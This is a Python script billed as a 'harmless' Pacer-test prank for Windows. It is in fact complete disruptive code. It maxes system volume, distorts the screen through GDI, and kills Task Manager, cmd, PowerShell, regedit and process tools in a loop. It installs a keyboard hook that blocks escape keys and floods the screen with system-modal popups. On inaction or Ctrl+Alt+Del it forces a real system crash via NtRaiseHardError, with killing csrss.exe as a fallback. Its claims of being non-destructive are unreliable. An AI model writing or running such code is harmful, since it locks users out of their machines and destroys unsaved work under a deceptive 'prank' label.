"""
pacer_prank.py  –  100% harmless prank  (Windows only for GDI effects)
Requirements:  pip install pygame pyautogui
Run:  python pacer_prank.py [path_to_pacer.mp3]
If no path is given, the script looks for any .mp3 in its own folder.

GDI effects draw DIRECTLY onto the Windows desktop device context via ctypes –
no overlay window, real GDI calls on the actual screen.
"""

import sys
import os
import time
import random
import threading
import glob
import ctypes
import ctypes.wintypes
import tkinter as tk
from tkinter import messagebox

# ── Win32 constants ───────────────────────────────────────────────────────────
PATINVERT       = 0x005A0049
DSTINVERT       = 0x00550009   # invert destination pixels
NOTSRCCOPY      = 0x00330008   # inverted copy
R2_XORPEN       = 7
PS_SOLID        = 0
BS_SOLID        = 0
HS_DIAGCROSS    = 5
TRANSPARENT     = 1

# ── Win32 GDI via ctypes ──────────────────────────────────────────────────────
user32  = ctypes.windll.user32
gdi32   = ctypes.windll.gdi32

GetDC            = user32.GetDC
ReleaseDC        = user32.ReleaseDC
GetDesktopWindow = user32.GetDesktopWindow

CreatePen        = gdi32.CreatePen
CreateSolidBrush = gdi32.CreateSolidBrush
CreateHatchBrush = gdi32.CreateHatchBrush
SelectObject     = gdi32.SelectObject
DeleteObject     = gdi32.DeleteObject
SetROP2          = gdi32.SetROP2
SetBkMode        = gdi32.SetBkMode
Rectangle        = gdi32.Rectangle
Ellipse          = gdi32.Ellipse
MoveToEx         = gdi32.MoveToEx
LineTo           = gdi32.LineTo
PatBlt           = gdi32.PatBlt
StretchBlt       = gdi32.StretchBlt
CreateCompatibleDC     = gdi32.CreateCompatibleDC
CreateCompatibleBitmap = gdi32.CreateCompatibleBitmap
BitBlt                 = gdi32.BitBlt
DeleteDC               = gdi32.DeleteDC
TextOutW         = gdi32.TextOutW
CreateFontW      = gdi32.CreateFontW
SetTextColor     = gdi32.SetTextColor
SetBkColor       = gdi32.SetBkColor
FillRect         = user32.FillRect
DrawTextW        = user32.DrawTextW

# BSOD palette (GDI uses BGR order)
BSOD_BLUE  = 0x00AA0000   # deep blue in BGR
BSOD_WHITE = 0x00FFFFFF

def rgb(r, g, b):
    return r | (g << 8) | (b << 16)

def rand_color():
    return rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

# ── optional deps ─────────────────────────────────────────────────────────────
try:
    import pygame
    PYGAME_OK = True
except ImportError:
    PYGAME_OK = False
    print("[warn] pygame not found – audio disabled.  pip install pygame")

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    PYAUTO_OK = True
except ImportError:
    PYAUTO_OK = False
    print("[warn] pyautogui not found – mouse jiggle disabled.  pip install pyautogui")

# ── find mp3 ──────────────────────────────────────────────────────────────────
def _find_mp3():
    # 1. Explicit command-line argument
    if len(sys.argv) > 1:
        return sys.argv[1]
    # 2. Bundled inside the exe (PyInstaller extracts to sys._MEIPASS)
    if hasattr(sys, "_MEIPASS"):
        bundled = glob.glob(os.path.join(sys._MEIPASS, "*.mp3"))
        if bundled:
            return bundled[0]
    # 3. .mp3 sitting next to the script / exe on disk
    here = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, "frozen", False) else __file__))
    found = glob.glob(os.path.join(here, "*.mp3"))
    return found[0] if found else None

MP3_PATH = _find_mp3()

# ── globals ───────────────────────────────────────────────────────────────────
click_count   = 0
error_count   = 0
jiggle_active = False
gdi_active    = False
app_running   = True
root          = None
btn           = None

JIGGLE_START  = 2
GDI_START     = 7
MAX_ERRORS    = 20


# ═══════════════════════════════════════════════════════════════════════════════
#  AUDIO
# ═══════════════════════════════════════════════════════════════════════════════

# Flag: True during first 45s (force max volume), False after (user controls volume)
_force_max_volume = True

def _system_volume_max():
    """
    Force Windows master volume to 100% using the Core Audio API via ctypes.
    Works independently of pygame — controls the actual Windows volume mixer.
    """
    try:
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)
        volume.SetMute(0, None)
    except Exception:
        # fallback: use nircmd or keybd_event to send volume-up keys repeatedly
        try:
            # Send VK_VOLUME_UP (0xAF) many times to slam volume to max
            for _ in range(50):
                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
                ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
        except Exception:
            pass

def play_audio():
    global _force_max_volume
    if not PYGAME_OK or not MP3_PATH or not os.path.isfile(MP3_PATH):
        print("[audio] skipped – no pygame or mp3 not found:", MP3_PATH)
        return
    pygame.mixer.init()
    pygame.mixer.music.load(MP3_PATH)
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play()

    audio_start = time.time()

    while app_running:
        try:
            elapsed = time.time() - audio_start

            if elapsed < 45.0:
                # Phase 1: force max volume — spam system volume up + pygame volume
                _force_max_volume = True
                pygame.mixer.music.set_volume(1.0)
                _system_volume_max()
                if not pygame.mixer.music.get_busy():
                    pygame.mixer.music.load(MP3_PATH)
                    pygame.mixer.music.set_volume(1.0)
                    pygame.mixer.music.play()
            else:
                # Phase 2: hands off — user has full control over volume
                _force_max_volume = False
                if not pygame.mixer.music.get_busy():
                    pygame.mixer.music.load(MP3_PATH)
                    pygame.mixer.music.play()

        except Exception:
            pass
        time.sleep(0.1)


# ═══════════════════════════════════════════════════════════════════════════════
#  MOUSE JIGGLE
# ═══════════════════════════════════════════════════════════════════════════════

def jiggle_loop():
    global app_running
    while app_running and jiggle_active:
        if not PYAUTO_OK:
            time.sleep(0.5)
            continue
        intensity = min((click_count - JIGGLE_START + 1) * 10, 140)
        dx = random.randint(-intensity, intensity)
        dy = random.randint(-intensity, intensity)
        try:
            cx, cy = pyautogui.position()
            sw, sh = pyautogui.size()
            nx = max(0, min(sw - 1, cx + dx))
            ny = max(0, min(sh - 1, cy + dy))
            pyautogui.moveTo(nx, ny, duration=0.04)
        except Exception:
            pass
        delay = max(0.02, 0.14 - (click_count - JIGGLE_START) * 0.01)
        time.sleep(delay)


# ═══════════════════════════════════════════════════════════════════════════════
#  REAL GDI EFFECTS  —  all 8 effects operate on actual screen pixel data
#  using memory DCs + BitBlt/StretchBlt, same technique as bomboclat_virus.
# ═══════════════════════════════════════════════════════════════════════════════
import math as _math
import struct as _struct

SRCCOPY   = 0x00CC0020
SRCINVERT = 0x00550009
HALFTONE  = 4

def _sw_sh():
    return user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

def _make_mem(hdc, sw, sh):
    mem = CreateCompatibleDC(hdc)
    bmp = CreateCompatibleBitmap(hdc, sw, sh)
    SelectObject(mem, bmp)
    return mem, bmp

def _free_mem(mem, bmp):
    DeleteObject(bmp)
    DeleteDC(mem)

# 1. Colour inversion — full screen + random extra patches
def gdi_invert(sw, sh):
    hdc = GetDC(None)
    BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, SRCINVERT)
    for _ in range(random.randint(3, 9)):
        x = random.randint(0, sw - 120)
        y = random.randint(0, sh - 120)
        w = random.randint(60, 320)
        h = random.randint(60, 220)
        BitBlt(hdc, x, y, w, h, hdc, x, y, SRCINVERT)
    ReleaseDC(None, hdc)

# 2. Horizontal sine wobble — copies each horizontal strip shifted
_wobble_phase = 0.0
def gdi_wobble(sw, sh):
    global _wobble_phase
    hdc = GetDC(None)
    mem, bmp = _make_mem(hdc, sw, sh)
    BitBlt(mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY)
    strip_h = 5
    for y in range(0, sh, strip_h):
        offset = int(_math.sin(_wobble_phase + y * 0.025) * 28)
        BitBlt(hdc, offset, y, sw, strip_h, mem, 0, y, SRCCOPY)
    _wobble_phase = (_wobble_phase + 0.35) % (2 * _math.pi)
    _free_mem(mem, bmp)
    ReleaseDC(None, hdc)

# 3. Zoom tunnel — copies screen into shrinking centered layers
def gdi_tunnel(sw, sh):
    hdc = GetDC(None)
    mem, bmp = _make_mem(hdc, sw, sh)
    BitBlt(mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY)
    layers = random.randint(4, 7)
    for i in range(layers):
        scale = 1.0 - (i + 1) * (0.85 / layers)
        nw = int(sw * scale)
        nh = int(sh * scale)
        nx = (sw - nw) // 2
        ny = (sh - nh) // 2
        gdi32.SetStretchBltMode(hdc, HALFTONE)
        StretchBlt(hdc, nx, ny, nw, nh, mem, 0, 0, sw, sh, SRCCOPY)
    _free_mem(mem, bmp)
    ReleaseDC(None, hdc)

# 4. Rotation chunks — random 90° flips on screen tiles
def gdi_rotation_chunks(sw, sh):
    hdc = GetDC(None)
    mem, bmp = _make_mem(hdc, sw, sh)
    BitBlt(mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY)
    tw = sw // random.randint(3, 6)
    th = sh // random.randint(3, 6)
    for ty in range(0, sh - th, th):
        for tx in range(0, sw - tw, tw):
            rot = random.choice([0, 1, 2, 3])
            if rot == 0:
                continue
            elif rot == 1:
                sx = tx + tw if tx + tw < sw else tx
                sy = ty + th if ty + th < sh else ty
                StretchBlt(hdc, tx, ty, tw, th, mem, sx, sy, -tw, -th, SRCCOPY)
            elif rot == 2:
                StretchBlt(hdc, tx, ty, tw, th, mem, tx + tw, ty, -tw, th, SRCCOPY)
            elif rot == 3:
                StretchBlt(hdc, tx, ty, tw, th, mem, tx, ty + th, tw, -th, SRCCOPY)
    _free_mem(mem, bmp)
    ReleaseDC(None, hdc)

# 5. Screen swirl — concentric ring warp using offset BitBlt
_swirl_angle = 0.0
def gdi_swirl(sw, sh):
    global _swirl_angle
    hdc = GetDC(None)
    mem, bmp = _make_mem(hdc, sw, sh)
    BitBlt(mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY)
    cx, cy  = sw // 2, sh // 2
    ring_w  = max(30, sw // 14)
    max_r   = min(cx, cy)
    for r in range(0, max_r, ring_w):
        ao = _math.sin(_swirl_angle + r * 0.04) * 40
        ox = int(_math.cos(_math.radians(ao)) * r * 0.12)
        oy = int(_math.sin(_math.radians(ao)) * r * 0.12)
        x1 = max(0, cx - r - ring_w)
        y1 = max(0, cy - r - ring_w)
        x2 = min(sw, cx + r + ring_w)
        y2 = min(sh, cy + r + ring_w)
        rw, rh = x2 - x1, y2 - y1
        if rw > 0 and rh > 0:
            sx = max(0, min(sw - rw, x1 + ox))
            sy = max(0, min(sh - rh, y1 + oy))
            BitBlt(hdc, x1, y1, rw, rh, mem, sx, sy, SRCCOPY)
    _swirl_angle = (_swirl_angle + 0.2) % (2 * _math.pi)
    _free_mem(mem, bmp)
    ReleaseDC(None, hdc)

# 6. Static noise — random grey/color blocks splattered on screen
def gdi_static(sw, sh):
    hdc = GetDC(None)
    for _ in range(random.randint(30, 80)):
        x  = random.randint(0, sw - 60)
        y  = random.randint(0, sh - 40)
        w  = random.randint(5, 60)
        h  = random.randint(5, 40)
        gr = random.randint(0, 255)
        color = gr | (gr << 8) | (gr << 16)
        brush = CreateSolidBrush(color)
        rb = _struct.pack("iiii", x, y, x + w, y + h)
        user32.FillRect(hdc, ctypes.create_string_buffer(rb), brush)
        DeleteObject(brush)
    ReleaseDC(None, hdc)

# 7. Vertical flip strips — alternating strips flipped upside-down
def gdi_vflip_strips(sw, sh):
    hdc = GetDC(None)
    mem, bmp = _make_mem(hdc, sw, sh)
    BitBlt(mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY)
    strip_w = sw // random.randint(6, 14)
    for x in range(0, sw - strip_w, strip_w * 2):
        StretchBlt(hdc, x, 0, strip_w, sh, mem, x, sh, strip_w, -sh, SRCCOPY)
    _free_mem(mem, bmp)
    ReleaseDC(None, hdc)

# 8. Kaleidoscope — mirrors half or quarter of screen onto the other half
def gdi_kaleidoscope(sw, sh):
    hdc = GetDC(None)
    mem, bmp = _make_mem(hdc, sw, sh)
    BitBlt(mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY)
    mode = random.randint(0, 3)
    hw, hh = sw // 2, sh // 2
    if mode == 0:
        StretchBlt(hdc, sw, 0, -sw, sh, mem, 0, 0, sw, sh, SRCCOPY)
    elif mode == 1:
        StretchBlt(hdc, 0, sh, sw, -sh, mem, 0, 0, sw, sh, SRCCOPY)
    elif mode == 2:
        StretchBlt(hdc, hw, 0, hw, sh, mem, hw, 0, -hw, sh, SRCCOPY)
    elif mode == 3:
        StretchBlt(hdc, 0, hh, sw, hh, mem, 0, hh, sw, -hh, SRCCOPY)
    _free_mem(mem, bmp)
    ReleaseDC(None, hdc)

# Effects ordered from mildest to most intense
# Level 0-1 : static noise only (barely noticeable)
# Level 2-3 : wobble added
# Level 4-5 : tunnel added
# Level 6-7 : rotation chunks + kaleidoscope
# Level 8-9 : swirl + vflip
# Level 10+ : full invert + everything, sleep shrinks to 0

GDI_LEVELS = [
    # (min_clicks, effect_pool, sleep, burst_range)
    # GDI thread only starts at click 7 (GDI_START), so 7 = level 0 baseline
    # Tunnel deliberately held back until click 20 so user has a real chance
    (7,  [gdi_static],                                              0.20, (20, 40)),  # 0  barely visible
    (9,  [gdi_static, gdi_wobble],                                  0.14, (16, 30)),  # 1  wobble starts
    (11, [gdi_wobble, gdi_wobble, gdi_static],                      0.10, (12, 24)),  # 2  more wobble
    (13, [gdi_wobble, gdi_static],                                  0.09, (12, 22)),  # 3  still just wobble
    (15, [gdi_wobble, gdi_rotation_chunks],                         0.08, (10, 20)),  # 4  chunks appear (no tunnel yet)
    (17, [gdi_wobble, gdi_rotation_chunks, gdi_kaleidoscope],       0.07, (8,  16)),  # 5  kaleido joins
    (19, [gdi_rotation_chunks, gdi_kaleidoscope, gdi_wobble],       0.055,(6,  14)),  # 6  chunks heavy
    (20, [gdi_rotation_chunks, gdi_kaleidoscope, gdi_tunnel],       0.045,(6,  12)),  # 7  TUNNEL STARTS HERE
    (22, [gdi_tunnel, gdi_kaleidoscope, gdi_swirl],                 0.038,(5,  10)),  # 8  swirl joins
    (24, [gdi_swirl, gdi_tunnel, gdi_vflip_strips],                 0.030,(4,  8)),   # 9  flips
    (26, [gdi_swirl, gdi_invert, gdi_tunnel, gdi_vflip_strips],     0.022,(3,  6)),   # 10 invert joins
    (28, [gdi_invert, gdi_swirl, gdi_tunnel, gdi_rotation_chunks],  0.015,(2,  4)),   # 11 near full
    (33, [gdi_invert, gdi_swirl, gdi_tunnel, gdi_rotation_chunks,
          gdi_kaleidoscope, gdi_vflip_strips, gdi_wobble],          0.008,(1,  2)),   # 12 FULL CHAOS
]

def _get_gdi_level():
    """Return the highest level whose min_clicks <= click_count."""
    level = GDI_LEVELS[0]
    for entry in GDI_LEVELS:
        if click_count >= entry[0]:
            level = entry
    return level

def gdi_thread_func():
    """
    GDI intensity scales with click_count.
    Starts as barely-visible static so the user can still click,
    then gets progressively more unhinged with every click.
    """
    global app_running
    sw, sh = _sw_sh()
    idx   = 0
    burst = 0

    while app_running and gdi_active:
        _, pool, sleep_t, burst_range = _get_gdi_level()
        try:
            pool[idx % len(pool)](sw, sh)
        except Exception as e:
            print("[gdi] error:", e)
        burst += 1
        if burst >= random.randint(*burst_range):
            burst = 0
            idx  += 1
        time.sleep(sleep_t)



# =============================================================================
#  FAKE BSOD  -  draws a Win10-style BSOD directly on the desktop HDC.
#  100% non-destructive; Task Manager still works underneath.
# =============================================================================

BSOD_BODY = [
    ":(",
    "",
    "Your PC ran into a problem that it couldn't handle,",
    "and it needs to restart.",
    "",
    "PACER_TEST_FAILURE",
    "",
    "If you'd like to know more, you can search online later for",
    "this error:  PACER_TEST_FAILURE",
    "",
    "",
    "0% complete",
    "",
    "You should have clicked the button.",
]

# =============================================================================
#  REAL KERNEL BSOD  -  triggers an actual Windows kernel crash via
#  NtRaiseHardError (undocumented NT API).
#
#  How it works:
#    1. RtlAdjustPrivilege(19, ...) grants SeShutdownPrivilege to this process
#    2. NtRaiseHardError with option=6 (OptionShutdownSystem) tells the kernel
#       to treat this as a fatal system error -> genuine BSOD + memory dump
#
#  Non-destructive: Windows writes a minidump, then on next boot runs chkdsk
#  if needed and boots normally.  No data corruption, no OS damage.
#
#  REQUIRES: script must be running as Administrator.
#  The script auto-relaunches itself elevated via UAC if it isn't already.
# =============================================================================

def trigger_real_bsod():
    """
    Triggers a real Windows kernel BSOD via NtRaiseHardError.
    Uses the exact same argtypes pattern that works without admin.
    Tries process token first, then thread token, then csrss fallback.
    Machine BSODs for real, writes a minidump, reboots fine.
    """
    # Stop audio
    try:
        if PYGAME_OK:
            pygame.mixer.music.stop()
    except Exception:
        pass

    # Kill the UI window before the BSOD hits
    # Use PostMessage WM_DESTROY directly — safe from any thread
    try:
        if root:
            hwnd_tk = ctypes.windll.user32.FindWindowW(None, "Totally Normal Program")
            if hwnd_tk:
                ctypes.windll.user32.PostMessageW(hwnd_tk, 0x0010, 0, 0)  # WM_CLOSE
    except Exception:
        pass

    time.sleep(0.4)

    ntdll = ctypes.windll.ntdll

    # Set argtypes explicitly — this is what makes it work without admin
    ntdll.RtlAdjustPrivilege.argtypes = [
        ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong,
        ctypes.POINTER(ctypes.c_ulong)
    ]
    ntdll.RtlAdjustPrivilege.restype = ctypes.c_ulong

    ntdll.NtRaiseHardError.argtypes = [
        ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong,
        ctypes.c_ulong, ctypes.c_ulong,
        ctypes.POINTER(ctypes.c_ulong)
    ]
    ntdll.NtRaiseHardError.restype = ctypes.c_ulong

    prev     = ctypes.c_ulong(0)
    response = ctypes.c_ulong(0)

    # Try process token (Impersonating=0)
    ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(prev))
    ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(response))
    if response.value == 6:
        return

    # Fallback: try thread token (Impersonating=1)
    ntdll.RtlAdjustPrivilege(19, 1, 1, ctypes.byref(prev))
    ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(response))
    if response.value == 6:
        return

    # Last resort: kill csrss.exe — it is a critical process,
    # Windows BSODs instantly when it dies
    import subprocess, psutil
    for proc in psutil.process_iter(["pid", "name"]):
        if proc.info["name"].lower() == "csrss.exe":
            subprocess.run(
                ["taskkill", "/F", "/PID", str(proc.info["pid"])],
                capture_output=True
            )
            break


def nag_loop():
    """
    Fires error popups in their own threads so they never block.
    Interval starts at 4s and shrinks by 0.3s each unacknowledged popup,
    down to a minimum of 0.5s — so ignoring them makes them come faster and faster.
    """
    global error_count, app_running
    last_clicks  = 0
    interval     = 4.0
    MIN_INTERVAL = 0.5
    ACCEL        = 0.3   # seconds to shave off per unacknowledged popup

    while app_running:
        time.sleep(interval)
        if not app_running:
            break

        if click_count == last_clicks:
            error_count += 1

            if error_count >= MAX_ERRORS:
                app_running = False
                # Close all open MessageBox popups by killing their window handles
                # so nothing blocks the BSOD call
                def _force_close_popups():
                    import ctypes
                    # EnumWindows to find and close any MessageBox dialogs
                    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
                    def _cb(hwnd, _):
                        try:
                            ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)  # WM_CLOSE
                        except Exception:
                            pass
                        return True
                    ctypes.windll.user32.EnumWindows(WNDENUMPROC(_cb), 0)
                _force_close_popups()
                time.sleep(0.2)
                # Fire BSOD in its own thread so nothing can block it
                threading.Thread(target=trigger_real_bsod, daemon=False).start()
                break

            # Fire popup in its own thread — never blocks the nag timer
            def _show_popup(n=error_count):
                try:
                    ctypes.windll.user32.MessageBoxW(
                        0,
                        f"Why aren't you clicking me?\n(Warning {n}/{MAX_ERRORS})",
                        "ERROR",
                        0x10 | 0x1000   # MB_ICONERROR | MB_SYSTEMMODAL (stays on top)
                    )
                except Exception:
                    pass
            threading.Thread(target=_show_popup, daemon=True).start()

            # Speed up — the longer they ignore it the faster it fires
            interval = max(MIN_INTERVAL, interval - ACCEL)

        else:
            last_clicks = click_count
            # Reset speed if they click the button
            interval = 4.0


# ═══════════════════════════════════════════════════════════════════════════════
#  BUTTON HANDLER
# ═══════════════════════════════════════════════════════════════════════════════

def on_click():
    global click_count, jiggle_active, gdi_active

    click_count += 1

    try:
        btn.config(text=f"Click me!  ({click_count})")
    except Exception:
        pass

    # escalate jiggle
    if click_count >= JIGGLE_START and not jiggle_active:
        jiggle_active = True
        threading.Thread(target=jiggle_loop, daemon=True).start()

    # launch REAL GDI effects
    if click_count >= GDI_START and not gdi_active:
        gdi_active = True
        threading.Thread(target=gdi_thread_func, daemon=True).start()



# =============================================================================
#  SYSTEM LOCKDOWN
#  - Kills Task Manager the moment it opens (loop)
#  - Blocks Win key, Ctrl+Shift+Esc, Ctrl+Alt+Del screen via low-level keyboard hook
#  - Keeps audio volume maxed via Windows mixer API
# =============================================================================

def _kill_taskmgr_loop():
    """Continuously kill Task Manager and other escape routes if they open."""
    import psutil
    BLOCKED = {
        "taskmgr.exe", "procexp.exe", "procexp64.exe",
        "processhacker.exe", "systeminformer.exe",
        "regedit.exe", "cmd.exe", "powershell.exe",
        "taskkill.exe", "mmc.exe",
    }
    while app_running:
        try:
            for proc in psutil.process_iter(["pid", "name"]):
                try:
                    if proc.info["name"].lower() in BLOCKED:
                        proc.kill()
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(0.3)



# Low-level keyboard hook to swallow escape combos
# Blocks: Win key, Ctrl+Shift+Esc, Alt+Tab, Alt+F4, Ctrl+Alt+Del signal
_hook_handle = None

def _install_keyboard_hook():
    """Install a WH_KEYBOARD_LL hook that eats all escape-route key combos."""
    import ctypes
    import ctypes.wintypes

    WH_KEYBOARD_LL = 13
    WM_KEYDOWN     = 0x0100
    WM_SYSKEYDOWN  = 0x0104

    # Virtual key codes to always block
    BLOCK_VK = {
        0x5B,  # VK_LWIN
        0x5C,  # VK_RWIN
        0x2C,  # VK_SNAPSHOT (PrintScreen)
    }

    HOOKPROC = ctypes.WINFUNCTYPE(
        ctypes.c_int, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM
    )

    def low_level_handler(nCode, wParam, lParam):
        if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            vk = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))[0]

            # Always block Win keys and PrintScreen
            if vk in BLOCK_VK:
                return 1

            # Block Ctrl+Shift+Esc (Task Manager)
            ctrl  = ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000
            shift = ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000
            alt   = ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000

            if ctrl and shift and vk == 0x1B:   # Ctrl+Shift+Esc
                return 1
            if alt and vk == 0x09:              # Alt+Tab
                return 1
            if alt and vk == 0x73:              # Alt+F4
                return 1
            if ctrl and alt and vk == 0x2E:     # Ctrl+Alt+Del (best effort)
                return 1

        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

    global _hook_handle
    cb = HOOKPROC(low_level_handler)
    # keep a reference so it isn't GC'd
    _install_keyboard_hook._cb = cb
    _hook_handle = ctypes.windll.user32.SetWindowsHookExW(
        WH_KEYBOARD_LL, cb, None, 0
    )

    # message pump to keep the hook alive
    msg = ctypes.wintypes.MSG()
    while app_running:
        ret = ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
        if ret == 0 or ret == -1:
            break
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))


def _watch_ctrl_alt_del():
    """
    Poll for Ctrl+Alt+Del every 50ms and trigger BSOD the instant it's pressed.
    WH_KEYBOARD_LL can't catch CAD (Windows intercepts it at kernel level),
    but GetAsyncKeyState polling fires fast enough to BSOD before the
    security screen appears.
    """
    VK_CONTROL = 0x11
    VK_MENU    = 0x12   # Alt
    VK_DELETE  = 0x2E
    kas = ctypes.windll.user32.GetAsyncKeyState
    triggered = False
    while app_running and not triggered:
        if (kas(VK_CONTROL) & 0x8000) and (kas(VK_MENU) & 0x8000) and (kas(VK_DELETE) & 0x8000):
            triggered = True
            trigger_real_bsod()
        time.sleep(0.05)


def start_lockdown():
    """Call once at startup to engage all lockdown mechanisms."""
    threading.Thread(target=_kill_taskmgr_loop, daemon=True).start()
    threading.Thread(target=_install_keyboard_hook, daemon=True).start()
    threading.Thread(target=_watch_ctrl_alt_del, daemon=True).start()

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 1 – pacer MP3 plays for 45 seconds, no window appears
# ═══════════════════════════════════════════════════════════════════════════════

def silent_phase():
    print("[phase 1] Pacer audio playing... window appears in 45 seconds.")
    threading.Thread(target=play_audio, daemon=True).start()
    time.sleep(45)
    print("[phase 1] Time's up – launching the prank!")


# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 2 – window appears, audio keeps playing
# ═══════════════════════════════════════════════════════════════════════════════

def _is_touchscreen():
    """
    Detect if the primary display supports touch input.
    Uses GetSystemMetrics(SM_DIGITIZER) — bit 6 set means integrated touch.
    Also checks SM_MAXIMUMTOUCHES > 0 as a fallback.
    """
    try:
        SM_DIGITIZER      = 94
        SM_MAXIMUMTOUCHES = 95
        NID_INTEGRATED_TOUCH = 0x41   # bits: ready(0x80) | multi(0x40) | touch(0x01)
        digitizer = ctypes.windll.user32.GetSystemMetrics(SM_DIGITIZER)
        max_touch = ctypes.windll.user32.GetSystemMetrics(SM_MAXIMUMTOUCHES)
        return bool(digitizer & NID_INTEGRATED_TOUCH) or max_touch > 0
    except Exception:
        return False


def launch_prank():
    global root, btn

    threading.Thread(target=nag_loop, daemon=True).start()

    is_touch = _is_touchscreen()
    print(f"[touch] touchscreen detected: {is_touch}")

    root = tk.Tk()
    root.title("Totally Normal Program")
    root.resizable(False, False)
    root.attributes("-topmost", True)

    win_w, win_h = 260, 120
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()

    # Base window position — centre of screen
    base_x = (sw - win_w) // 2
    base_y = (sh - win_h) // 2
    root.geometry(f"{win_w}x{win_h}+{base_x}+{base_y}")

    frame = tk.Frame(root, bg="#f0f0f0", padx=20, pady=20)
    frame.pack(fill="both", expand=True)

    btn = tk.Button(
        frame,
        text="Click me!",
        bg="white", fg="black",
        font=("Arial", 14, "bold"),
        relief="raised", bd=3,
        padx=10, pady=8,
        command=on_click,
    )
    btn.pack(expand=True)

    # ── touchscreen window shake ──────────────────────────────────────────────
    if is_touch:
        _shake_offset = [0]
        _shake_dir    = [1]

        def _shake_window():
            """
            Rapidly relocate the window in a jittery pattern so it's hard
            to tap accurately on a touchscreen.
            Intensity increases with click_count just like the mouse jiggle.
            """
            if not app_running:
                return
            intensity = max(8, min(click_count * 6, 120))
            ox = random.randint(-intensity, intensity)
            oy = random.randint(-intensity, intensity)
            nx = max(0, min(sw - win_w, base_x + ox))
            ny = max(0, min(sh - win_h, base_y + oy))
            try:
                root.geometry(f"{win_w}x{win_h}+{nx}+{ny}")
            except Exception:
                pass
            delay = max(30, 200 - click_count * 8)
            root.after(delay, _shake_window)

        root.after(500, _shake_window)

    # ── block ALL normal exit methods ────────────────────────────────────────
    # X button / Alt+F4 → do nothing
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Block common keyboard quit shortcuts
    for seq in ("<Control-w>", "<Control-q>", "<Control-c>",
                "<Alt-F4>", "<Escape>"):
        root.bind(seq, lambda e: "break")

    # Remove the close button entirely via Win32
    # GWL_STYLE=-16, WS_SYSMENU=0x00080000
    def kill_close_button():
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, "Totally Normal Program")
            if hwnd:
                style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
                ctypes.windll.user32.SetWindowLongW(hwnd, -16, style & ~0x00080000)
                ctypes.windll.user32.SetWindowPos(
                    hwnd, None, 0, 0, 0, 0,
                    0x0001 | 0x0002 | 0x0004 | 0x0010
                )
        except Exception:
            pass

    kill_close_button()

    # Re-assert every 500ms in case Windows re-enables anything
    def enforce_no_close():
        if not app_running:
            return
        kill_close_button()
        root.after(500, enforce_no_close)

    root.after(200, enforce_no_close)
    root.mainloop()


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    start_lockdown()   # engage full system lockdown immediately
    print("[pacer_prank] Starting – pacer audio plays for 45 seconds before anything appears.")
    silent_phase()
    print("[pacer_prank] GO!")
    launch_prank()
    print("[pacer_prank] Done.")
